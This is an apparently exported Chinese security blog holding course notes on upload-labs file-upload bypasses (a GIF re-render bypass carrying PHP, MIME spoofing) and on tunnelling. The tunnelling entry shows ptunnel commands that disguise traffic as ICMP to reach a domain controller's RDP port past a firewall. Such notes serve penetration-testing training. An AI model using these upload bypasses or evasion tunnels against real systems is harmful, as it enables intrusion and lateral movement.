<p> <strong>绕过方法：找到渲染前后没有变化的位置,然后将php代码写进去,就可以成功上传带有php代码的图片</strong> </p>
</blockquote>
<ol>
<li><strong><?php phpinfo(); ?></strong>  添加到gif文件的尾部</li>
</ol>
<p><img src="/../../images/xdwjsc/1650685946083.png" alt="1650685946083"></p>
<p>上传后在下载下来发现二次渲染了</p>
<p><img src="/../../images/xdwjsc/1650685993545.png" alt="1650685993545"></p>
<ol start="2">
<li><strong>关于绕过gif的二次渲染，我们只需要找到渲染前后没有变化的位置，然后将php代码写进去，就可以成功上传带有php代码的图片了</strong></li>
</ol>
<p><img src="/../../images/xdwjsc/1650686208435.png" alt="1650686208435"></p>
<ol start="3">
<li><p>上传修改过的图片马</p>
<p><img src="/../../images/xdwjsc/1650686344438.png" alt="1650686344438"></p>
</li>
</ol>
<h4><span id="2-pngjpg绕过">2 .PNG，JPG绕过</span></h4><p>有点麻烦不想写了，参考大佬博客吧</p>
<p><a href="https://www.fujieace.com/penetration-test/upload-labs-pass-16.html">付杰博客</a></p>
<h4><span id="3学习扩展">3.学习扩展</span></h4><p>Pass16参考文章：</p>
<p><a href="https://blog.csdn.net/weixin_44604541/article/details/108847008">CSND思源湖的鱼</a></p>
<p><a href="https://www.fujieace.com/penetration-test/upload-labs-pass-16.html">付杰博客</a></p>
<p>视频：</p>
<iframe src="//player.bilibili.com/player.html?aid=68451394&bvid=BV1bJ411u77o&cid=118635716&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" height="500" width="800"> </iframe>
------



<iframe src="//player.bilibili.com/player.html?aid=92395475&bvid=BV1dE411n7tE&cid=157740529&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" height="500" width="800"> </iframe>
## Pass-17/18  (条件竞争)

<p>实验环境出了点问题</p>
<p>参开链接</p>
<p><a href="https://www.fujieace.com/penetration-test/upload-labs-pass-17.html">付杰博客</a></p>
<p>B站视频</p>
<iframe src="//player.bilibili.com/player.html?aid=715622672&bvid=BV12Q4y1o7Ya&cid=338199976&page=34" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" height="500" width="800"> </iframe>
## Pass-20  (多种方法)

<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5D%20.assets/1650787223757.png" alt="1650787223757"></p>
<h2><span id="pass-21-来自ctf">Pass-21  (来自CTF)</span></h2><p>代码中有检查MEMI，将MIME改成图片类型</p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5D%20.assets/1650867245630.png" alt="1650867245630"></p>
<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5D%20.assets/1650866223537.png" alt="1650866223537"></p>
]]></content>
      <categories>
        <category>小迪安全</category>
      </categories>
  </entry>
  <entry>
    <title>小迪安全系列-[隧道技术]</title>
    <url>/2022/05/06/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%5D/</url>
    <content><![CDATA[<h1><span id="域横向内网漫游-socks-代理隧道技术"><strong>域横向内网漫游 Socks 代理隧道技术</strong></span></h1><p><img src="/../../images/xdnwaq/165174493307521.png" alt="1651793307521"></p>
<p>必备知识点:<br><strong>1.代理和隧道技术区别?</strong></p>
<blockquote>
<p><strong>代理解决网络通讯问题</strong></p>
</blockquote>
<blockquote>
<p><strong>隧道绕过端口屏蔽的通讯方式，如果防火墙拦截某个协议，端口，那么利用隧道技术改变通信协议进行绕过拦截</strong></p>
</blockquote>
<p><strong>2.隧道技术为了解决什么?</strong></p>
<blockquote>
<p><strong>为了解决某些协议，端口被防火墙拦截，通过隧道技术改变通信协议进行绕过，单独的通道来传输被拦截的东西</strong></p>
</blockquote>
<p><strong>3.隧道技术前期的必备条件?</strong></p>
<blockquote>
<p><strong>在数据通信被拦截的情况下利用隧道技术封装改变通信协议进行绕过拦截</strong><br><strong>CS、MSF无法上线，数据传输不稳定无回显，出口数据被监控，网络通信存在问题等</strong></p>
</blockquote>
<blockquote>
<p><strong>隧道：在实际的网络中，通常会通过各种边界设备、软&#x2F;硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。那么什么是隧道呢?这里的隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上。</strong></p>
</blockquote>
<p><strong>常用的隧道技术有以下三种:</strong></p>
<blockquote>
<p><strong>网络层:IPv6隧道、ICMP隧道</strong></p>
<p><strong>传输层:TCP隧道、UDP隧道、常规端口转发</strong></p>
<p><strong>应用层:sSH 隧道、HTTP&#x2F;S 隧道、DNS 隧道</strong></p>
</blockquote>
<h1><span id="案例一网络传输应用层检测连通性">案例一：网络传输应用层检测连通性</span></h1><p>探针对方协议是否支持</p>
<p>例如探针对方是否开启ICMP命令，我们只需要<code>ping</code>以下对方主机是否的到回显</p>
<blockquote>
<p>TCP协议 </p>
<p>用瑞士军刀—netcat</p>
<p>执行nc命令：nc <ip> &lt;端口&gt;</ip></p>
</blockquote>
<blockquote>
<p>2.HTTP 协议</p>
<p>用curl工具，执行curl &lt;IP地址：端口&gt;命令，如果远程主机开启了相对应的端口，且内网可连接外网的话，就会输出相应的端口信息</p>
</blockquote>
<blockquote>
<p>ICMP协议</p>
<p>用ping命令，执行ping &lt;IP地址&gt;&lt;&#x2F;域名&gt;</p>
</blockquote>
<blockquote>
<p>DNS协议</p>
<p>检测DNS连通性常用的命令是nslookup和did</p>
<p><strong>nslookup是Windows自带的DNS探测命令</strong></p>
<p><strong>dig是Linux系统自带的DNS探测命令</strong></p>
</blockquote>
<h1><span id="案例二网络层隧道ptunnel使用-检测利用">案例二：网络层隧道Ptunnel使用-检测,利用</span></h1><p><img src="/../../images/xdnwaq/1651814479104.png" alt="1651814479104"></p>
<h2><span id="pingtunnel基础命令">Pingtunnel基础命令：</span></h2><p>pingtunnel是把TCP&#x2F;UDP&#x2F;SOCK5流量伪装成ICMP流量进行转发的工具</p>
<p>老版本：<a href="https://github.com/esrrhs/pingtunnel/releases">https://github.com/esrrhs/pingtunnel/releases</a></p>
<p> <a href="https://x1aojun.lanzoub.com/iW8uh04fawwj">蓝奏云</a>  密码:biuh </p>
<blockquote>
<p><strong>-x ：指定ICMP隧道连接的验证密码</strong><br><strong>-lp：指定要监听的本地TCP端口</strong><br><strong>-da：指定要转发的目标机器的IP地址</strong><br><strong>-dp：指定要转发的目标机器的TCP端口</strong><br><strong>-p：指定ICMP隧道连一段的IP地址</strong></p>
</blockquote>
<h2><span id="kali安装"><strong>Kali安装</strong></span></h2><p> git clone <a href="http://freshmeat.sourceforge.net/projects/ptunnel/">http://freshmeat.sourceforge.net/projects/ptunnel/</a></p>
<p>或者： </p>
<p>wget <a href="http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz">http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz</a><br>tar zxvf libpcap-1.9.0.tar.gz </p>
<p><a href="https://blog.csdn.net/markecheng/article/details/110352161">安装参考</a></p>
<p>解析：Hacker控制了Webserver，同时web server有两块网卡，一个通向外网，一个通向内网</p>
<p>目的：Hacker控制webserver，通过控制webserver远程打开Dc的3389给外网的Hacker，并且不使用TCP协议</p>
<p><img src="/../../images/xdnwaq/1651814479104.png" alt="1651814479104"></p>
<p>.&#x2F;ptunnel -x admin</p>
<p>.&#x2F;ptunnel -p  webserverIP -lp Hacker端口 -da DcIP -dp DC的3389 -x 连接密码</p>
<h1><span id="案例三-传输层转发隧道portmap使用-检测利用">案例三-传输层转发隧道Portmap使用-检测,利用</span></h1>]]></content>
      <categories>
        <category>小迪安全</category>
      </categories>
  </entry>
</search>
